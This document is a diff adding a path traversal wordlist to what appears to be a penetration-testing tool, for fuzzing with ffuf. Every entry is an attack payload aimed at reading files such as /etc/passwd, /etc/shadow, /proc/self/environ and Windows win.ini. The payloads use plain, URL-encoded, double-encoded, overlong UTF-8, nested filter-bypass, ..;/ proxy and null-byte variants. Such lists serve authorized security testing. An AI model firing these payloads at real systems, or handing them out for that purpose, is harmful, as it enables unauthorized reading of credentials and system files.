@@ -1,0 +1,133 @@
+# HackPraxis path/directory traversal payloads
+# Default list targets a Unix passwd read so ffuf's default regex (root:.*:0:0:) matches out of the box.
+# Set a 'Target file' in the UI (e.g. etc/passwd) to turn these into prefixes for a different file,
+# or edit this list freely. Sources: PayloadsAllTheThings, common public LFI/traversal cheat sheets.
+# Authorized targets only.
+#
+# --- plain ../ to /etc/passwd (depth 1-8) ---
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+# --- leading-slash + ../ (some apps strip the first slash) ---
+/../etc/passwd
+/../../etc/passwd
+/../../../etc/passwd
+/../../../../etc/passwd
+/../../../../../etc/passwd
+/../../../../../../etc/passwd
+/../../../../../../../etc/passwd
+/../../../../../../../../etc/passwd
+# --- absolute paths (no traversal needed) ---
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+file:///etc/passwd
+# --- URL-encoded ../  (%2e%2e%2f) ---
+%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+# --- mixed-encoded ..%2f ---
+..%2fetc%2fpasswd
+..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+# --- double URL-encoded (%252e%252e%252f) ---
+%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+# --- overlong UTF-8 / illegal unicode encodings ---
+%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+%c0%2e%c0%2e%c0%afetc/passwd
+%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
+%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
+%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
+%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
+%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc/passwd
+..%u2215etc%u2215passwd
+..%u2215..%u2215etc%u2215passwd
+..%u2215..%u2215..%u2215etc%u2215passwd
+..%u2215..%u2215..%u2215..%u2215etc%u2215passwd
+..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd
+..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc%u2215passwd
+# --- nested / filter-bypass variants (strip-once filters) ---
+....//etc/passwd
+....//....//etc/passwd
+....//....//....//etc/passwd
+....//....//....//....//etc/passwd
+....//....//....//....//....//etc/passwd
+....//....//....//....//....//....//etc/passwd
+....\/etc/passwd
+....\/....\/etc/passwd
+....\/....\/....\/etc/passwd
+....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/etc/passwd
+....\/....\/....\/....\/....\/....\/etc/passwd
+..././etc/passwd
+..././..././etc/passwd
+..././..././..././etc/passwd
+..././..././..././..././etc/passwd
+..././..././..././..././..././etc/passwd
+..././..././..././..././..././..././etc/passwd
+# --- reverse-proxy (..;/) ---
+..;/etc/passwd
+..;/..;/etc/passwd
+..;/..;/..;/etc/passwd
+..;/..;/..;/..;/etc/passwd
+..;/..;/..;/..;/..;/etc/passwd
+..;/..;/..;/..;/..;/..;/etc/passwd
+# --- null-byte / extension truncation ---
+../../../../etc/passwd%00
+../../../../etc/passwd%00.png
+../../../../etc/passwd%2500
+..%2f..%2f..%2f..%2fetc%2fpasswd%00
+# --- Windows targets (../ and ..\) ---
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\windows\win.ini
+..\..\..\..\..\..\..\..\windows\win.ini
+../windows/win.ini
+../../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+../../../../../windows/win.ini
+../../../../../../windows/win.ini
+../../../../../../../windows/win.ini
+../../../../../../../../windows/win.ini
+C:\windows\win.ini
+c:/windows/win.ini
+C:\windows\system32\drivers\etc\hosts
+%2e%2e%5c%2e%2e%5cwindows%5cwin.ini
+# --- generic prefixes (blank the body target, set Target file = etc/passwd to use) ---
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
